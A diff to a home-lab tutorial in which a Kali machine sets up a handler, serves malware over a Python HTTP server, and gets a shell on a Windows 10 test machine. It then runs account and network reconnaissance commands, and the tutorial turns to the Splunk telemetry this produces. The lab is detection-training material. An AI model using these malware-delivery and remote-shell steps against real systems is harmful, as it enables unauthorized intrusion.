@@ -207,7 +207,7 @@ We are going to be using VirtualBox as our Hypervisor.
     - set lhost 192.168.20.11 (this is the Kali linux machine)
 13. Now we type the following command to start the exploit:
     - exploit
-14. Our next step is to setup a HTTP server on our Kali machine so it can download the malware. We will do this using **Python**
+14. Our next step is to setup a HTTP server on our Kali machine so our test machine can download the malware. We will do this using **Python**
 15. In a new Terminal window/tab, type in the following command:
     - python3 -m http.server 9999
 16. Now we move over to our **Windows 10 Machine** and do the following:
@@ -228,3 +228,10 @@ We are going to be using VirtualBox as our Hypervisor.
 ### Kali Linux
 24. We can see the connection in our handler
 ![screenshot of the kali linux terminal window showing the established connection with our windows 10 machine](/img/KaliTerminal.png)
+    > If you type in "help" - you will see all the available commands at our disposal
+25. Type in "shell" to establish a shell on our Windows 10 machine
+26. Type in "net user" to see a list of every user account on the Windows 10 machine
+26. Type in "net localgroup" to see a list of all the local groups on the local server
+26. Type in "ipconfig" to see a list of IPv4 and IPv6 addresses, subnet mask, and default gateway for all adapters.
+27. Now we go back to our Windows 10 machine to see what sort of Telemetry it's generated using **Splunk**
+
